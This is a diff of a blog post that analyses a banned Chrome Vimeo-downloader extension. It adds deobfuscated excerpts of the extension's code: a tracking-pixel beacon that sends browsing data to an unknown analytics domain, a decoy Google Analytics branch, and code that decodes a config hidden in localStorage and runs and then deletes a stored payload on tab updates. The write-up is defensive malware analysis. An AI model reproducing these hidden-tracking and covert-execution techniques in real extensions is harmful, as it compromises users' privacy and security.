@@ -8,7 +8,10 @@ Throughout the years, there is more and more evidence that malicious Chrome exte
 
 Attackers employ a range of strategies to lure unsuspecting users into their trap. The most basic types of attacks on the Chrome store are extensions that pose as other legitimate extensions out there such as [Snapchat for Chrome](https://chrome.google.com/webstore/detail/snapchat-for-chrome/dhcjddnandoaonmnidbdnbbkmlmmnell?hl=en-US). Higher level attacks include injecting advertisements into a page, redirecting users to phishing sites, tracking user browsing behavior, stealing user credentials from sites, mining Bitcoin, and more. Despite Chrome's more rigid [Content Security Policy](https://developers.google.com/web/fundamentals/security/csp) enforced a couple of years ago, these malicious attacks can very well still occur if a loophole is found.
 
-Today, attackers have gotten more crafty with their attacks. Popular extensions with a large and trusting community are now sometimes sold to those who have harmful intentions. Attackers can modify the source to include malicious code. The code can then be deployed to almost all users around the world due to [Chrome's Autoupdate](https://support.google.com/chrome/a/thread/3050651?hl=en) feature for extensions. A notable example of this is [NanoAdblocker](https://github.com/NanoAdblocker/NanoCore/issues/362#issuecomment-709428210).
+![Fake Facetime Extension](https://raw.githubusercontent.com/Spiderpig86/blog/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%201/facetime.PNG)
+*This extension is a grim reminder that we live in a world where people think Facetime is available on Chrome.*
+
+Today, attackers have gotten more crafty with their attacks. Popular extensions with a large and trusting community are now sometimes sold to those who have harmful intentions. Attackers can modify the source to include malicious code. Thanks to [Chrome's Autoupdate](https://support.google.com/chrome/a/thread/3050651?hl=en) feature for extensions, the now harmful extension can reach most Chrome users in days. A notable example of this is [NanoAdblocker](https://github.com/NanoAdblocker/NanoCore/issues/362#issuecomment-709428210).
 
 Most of the articles written for regarding the latest batch of banned extensions have been quite shallow, so I hope this series of blog posts will help shed some light on what these extensions are doing with your browsing data.
 
@@ -29,6 +32,8 @@ To install, you will have to enable **developer mode** in `chrome://extensions` 
 ## Initial Look at the Code
 
 Given that the extension was flagged, I was curious to see the code that got this flagged in the first place. One tool that is great for viewing the source of Chrome extensions without having to download it is [CrxViewer](https://robwu.nl/crxviewer/). If you already have the source, any editor like VSCode would work just as well, if not better.
+
+> *Wait, where's the link to the code?* In order to remove any liability of me "distributing" code that can be used for bad intentions, I will not be providing the full source. You, the reader, have full liberty to seek it for yourself. 😎
 
 Running `tree` yields the following directory structure:
 
@@ -58,11 +63,11 @@ Running `tree` yields the following directory structure:
 52 directories, 84 files
 ```
 
-The part of the source I will focus on is the `js` folder. 
+The part of the source I will focus on is the `js` folder, which is the meat of the extension.
 
 ### Manifest File
 
-A glance at the extension’s manifest file should give us some hint as to what this extension can do. The first section I looked into was the `background` section since background scripts are typically responsible for what is run inside the extension window itself. Strangely, the `persistent` flag is set to `true`, which according to Chrome’s documentation,  means the extension uses the *[chrome.webRequest API](https://developer.chrome.com/docs/extensions/webRequest/)*.
+A glance at the extension’s manifest file should give us some hint as to what this extension can do. The first section I looked into was the `background` section since background scripts are typically responsible for what is run inside the extension window itself. Strangely, the `persistent` flag is set to `true`, which according to Chrome’s documentation, means the extension uses the *[chrome.webRequest API](https://developer.chrome.com/docs/extensions/reference/webRequest/)*. To give the creator the benefit of the doubt, let's say this API is used for fetching the videos to be downloaded rather than pinging some remote server.
 
 ```json
 "background": {
@@ -83,7 +88,7 @@ In the `content_scripts` section, it states that the script will execute for all
 } ],
 ```
 
-The extension’s **CSP** (content security policy) dictates what the script and cannot do to help prevent things such as XSS attacks. What is a big red flag in this extension that is allowed is using the `eval` function by including the `unsafe-eval` flag in the `content_security_policy` field. According to [this StackOverflow question](https://stackoverflow.com/questions/45072882/adding-unsafe-eval-to-existing-chrome-extension), the inclusion of `unsafe-eval` should’ve flagged this extension for manual review, but somehow it still made it to the Chrome store. Some info I found about the review process can be read [here](https://developer.chrome.com/docs/webstore/faq/#faq-listing-08).
+Moving onto the next section, the extension’s **CSP** (content security policy) dictates what the script and cannot do to help prevent things such as XSS attacks. What is a big red flag in this extension that is allowed is using the `eval` function by including the `unsafe-eval` flag in the `content_security_policy` field. According to [this StackOverflow question](https://stackoverflow.com/questions/45072882/adding-unsafe-eval-to-existing-chrome-extension), the inclusion of `unsafe-eval` should’ve flagged this extension for manual review, but somehow it still made it to the Chrome store. Some info I found about the review process can be read [here](https://developer.chrome.com/docs/webstore/faq/#faq-listing-08).
 
 ```json
 "content_security_policy": "script-src 'self' https://*.vimeo.com 'unsafe-eval'; object-src https://*.vimeo.com 'self'",
@@ -130,7 +135,7 @@ chrome.webRequest.onCompleted.addListener(function(a) {
 }, ["responseHeaders"]),
 ```
 
-A quick search to find what got pushed into array `x` shows that we are listening to a domain called `count.users-analytics.com/`. To me, this was a very strange URL for anyone to use to get extension usage analytics. This was certainly not something associated with Google Analytics. 
+A quick search to find what got pushed into array `x` shows that we are listening to a domain called `count.users-analytics.com`. To me, this was a very strange URL for anyone to use to get extension usage analytics. This was certainly not something associated with Google Analytics.
 
 ```js
 C = function() {
@@ -140,13 +145,18 @@ C = function() {
 },
 ```
 
-Nothing really useful came out of trying to find out the WHOIS information for the domain itself. The only piece of info that could be useful is its 2020-12-03 15:27:18 UTC registration date, indicating it was very recent. Out of curiosity, I pinged `users-analytics.com` and received no response. However, `count.users-analytics.com` actually did return a response in the form of a 1x1 GIF. At first, I wasn’t sure why a GIF was returned but then it hit me that this acts as a [tracking pixel](https://en.wikipedia.org/wiki/Web_beacon). In short, a tracking pixel is a technique used by someone to see if some content has been loaded by a user. It usually is in the form of a 1x1 GIF which makes it invisible to the typical user.
+![WHOIS](https://raw.githubusercontent.com/Spiderpig86/blog/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%201/whois.PNG)
+
+Nothing really useful came out of trying to find out the WHOIS information for the domain itself. The only piece of info that could be useful is its 2020-12-03 15:27:18 UTC registration date, indicating it was very recent. Out of curiosity, I pinged `users-analytics.com` and received no response. However, `count.users-analytics.com` actually did return a response in the form of a 1x1 GIF. At first, I wasn’t sure why a GIF was returned but then it hit me that this acts as a [tracking pixel](https://en.wikipedia.org/wiki/Web_beacon). In short, a tracking pixel is a technique used by websites to see if users loaded an email, webpage, etc. It usually is in the form of a 1x1 GIF which makes it invisible to the typical user.
+
+![wget](https://raw.githubusercontent.com/Spiderpig86/blog/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%201/wget.PNG)
 
 Now to me, this doesn’t seem to be too big of an issue since this is the same technique employed by Google, Facebook, Microsoft, etc. for their trackers. However, it is sending information to some unknown domain which is very suspect. The URL requested is in the form of:
 
 ```
 https://count.users-analytics.com/count.gif?_e_i=downl-imeo&ed_=aaaaaaaabci&_vv=1.1.9&r=0.0001&_l=en-US&_k=br&t=1600000000000&_idu=5wxzrw3585ososi1
 ```
+*Query parameters have been edited for privacy.*
 
 To summarize the query parameters (important ones at least):
 
@@ -200,7 +210,7 @@ To summarize the query parameters (important ones at least):
   }
   ```
 
-The request itself is triggered within this function `t`.
+The request to this dingy analytics domain is triggered within this function `t`.
 
 ```js
 function t(a) {
@@ -211,6 +221,20 @@ function t(a) {
 ```
 
 Notice how the Google Analytics URL is also shown, but don’t let that fool you. If you read this carefully, you’ll see that the condition `c > 2` is always false. `c` starts as a number from 0 (inclusive) to 1 (exclusive). The code subsequently adds 1, but the resulting value is never greater than 2. A request will always be made to the URL stored in `x[2]`, which is `counter.users-analytics.com`. How cheeky.
+
+```js
+// Better Readability
+function t(a) {
+    var b = new Image,
+        c = Math.random(); // 0 <= c < 1
+    c += 1; // 1 <= c < 2
+    if (c > 2) {
+        b.src = ["https://www.google-analytics.com/_utm.gif?", m(), k(), l(), i(), n(), j(a), p()].join("").replace(/&$/, "")
+    } else {
+        b.src = ["https://", x[2], g(), q(), m()].concat(s([k(), l(), i(), n(), o(), j(a), p()])).join("").replace(/&$/, "")
+    }
+}
+```
 
 ##### Strange String Function
 
@@ -234,13 +258,46 @@ String.prototype.strvstrevsstr = function() {
 }
 ```
 
-Someone does not want us to see some of the data being used and processed. Without actually using this extension, we won’t know what this is used for other than how it is called in some parts of the code.
+Obivously someone doesn't want people like me to be snooping around their extension. Without actually using this extension, we won’t know what this is used for other than how it is called in some parts of the code.
 
- `strvstrevsstr` gets invoked if we can find a string that is greater than 10 chars in length in the string stored in local storage with the key `cache-control` as described earlier. The `cache-control` header [typically holds these values](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control), but nothing stops a bad actor from inserting additional information into the field, like an encoded string. Without running the extension, it isn’t too clear what is going on with this function.
+`strvstrevsstr` gets invoked if we can find a string that is greater than 10 chars in length in the string stored in local storage with the key `cache-control` (for some reason now it filters for 10 chars rather than 20 as stated earlier). The `cache-control` header [typically holds these values](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control), but nothing stops a bad actor from inserting additional information into the field, like an encoded string. Without running the extension, it isn’t too clear what is going on with this function. What we can tell from reading this code is that once `e` is decoded in some form with `strvstrevsstr` and parsed as a JSON object, its object entries are written to window. `A` gets set to true to possibly indicate that this step has completed.
+
+```js
+getMediaPath: function() {
+    var a = window.localStorage;
+    if (a["cache-control"]) {
+        var b = a["cache-control"].split(",");
+        try {
+            var c;
+            for (var d in b) {
+                var e = b[d].trim();
+                if (!(e.length < 10)) try {
+                    if (c = e.strvstrevsstr(), c = "undefined" != typeof JSON && JSON.parse && JSON.parse(c), c && c.cache_c) {
+                        for (var f in c) window[f] = c[f];
+                        A = !0;
+                        break
+                    }
+                } catch (g) {}
+            }
+        } catch (g) {}
+        this.setMediaPath()
+    }
+}
+```
+
+Subsequently, `setMediaPath` is called as part of some callback to store something into local storage with the key `cfg_audio_id`.
+```js
+setMediaPath: function() {
+    "undefined" != typeof jj && jj && uu && gg > jj && window[jj][gg](uu, function(a) {
+        var b = "cfg_audio_id";
+        localStorage[b] = a
+    })
+}
+```
 
 ##### Hit and Run Function
 
-Interesting how this function seems to call something using whatever that is stored in `cfg_audio_id` and then deleting it right after. I’ll have more details on this in the coming parts.
+Interesting how this function seems to call something using whatever that is stored in `cfg_audio_id` and then deleting it right after.
 
 ```js
 findDetails: function() {
@@ -251,6 +308,31 @@ findDetails: function() {
     }
 }
 ```
+
+Tracing the callers shows that `findDetails` is called as part of some callback function with a delay of `1500ms`.
+
+```js
+function e(a, b, c) {
+    b.url && (b.url.indexOf("vimeo.com") > -1 && chrome.tabs.sendMessage(a, "url_changed"), A || (setTimeout(function() {
+        D.findDetails();
+    }, 1500), console.trace('set'), B.getMediaPath()))
+}
+```
+
+The function `e` is triggered as an event listener for when chrome tabs are updated.
+
+```js
+chrome.tabs.onRemoved.addListener(function(a, b) {
+			var c = w.indexOf(a);
+			c > -1 && w.splice(c, 1)
+        }), chrome.tabs.onUpdated.addListener(e), chrome.browserAction.onClicked.addListener(D.openVimeoByClickListener), "config" == localStorage.userSettings && D.addStringParser()
+```
+
+According to [Chrome's documentation](https://developer.chrome.com/docs/extensions/reference/tabs/#event-onUpdated), the `onUpdated` event fires whenever any of the following changes:
+
+![onUpdate Events](https://raw.githubusercontent.com/Spiderpig86/blog/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%201/onUpdate.PNG)
+
+If these findings tell us anything, it's that the extension is trying to execute some code whenever the tab gets updated. Once executed, it deletes itself in order to hide from the user.
 
 ##### This Extension Has Friends
 
@@ -293,12 +375,10 @@ run: function() {
 
 ### Other Scripts
 
-The other scripts did not seem to have anything too out of the ordinary that could be" malicious. For now, I will skip talking about these.
+The other scripts did not seem to have anything too out of the ordinary that could be malicious. For now, I will skip talking about these.
 
 ## Closing Thoughts
 
 When I first tested this extension with minimal and basic usage, it seems like nothing was inherently wrong. The extension worked as stated.
 
-The red flags that caught my eye were the tracking pixel requested from an unknown host and the scrambled code intended to mislead any user like me. At this point, I wasn’t entirely sure if the extension was banned purely for the reason of having a tracking pixel residing in an unknown domain. There had to be more to it that warranted its expulsion from the Chrome Web Store. With that being said, more testing needs to occur to see what is going on when we use the extension.
-
-In the next part, I will walk through my initial findings on how this extension operates while you have it installed on your browser.
+Initially, the red flags that caught my eye were the tracking pixel requested from an unknown host and the scrambled code intended to mislead any user like me. I wasn’t entirely sure if the extension was banned purely for the reason of having a tracking pixel residing in an unknown domain. There had to be more to it that warranted its expulsion from the Chrome Web Store. Looking closer at the code revealed that something was being executed on tab update events. But what is it?
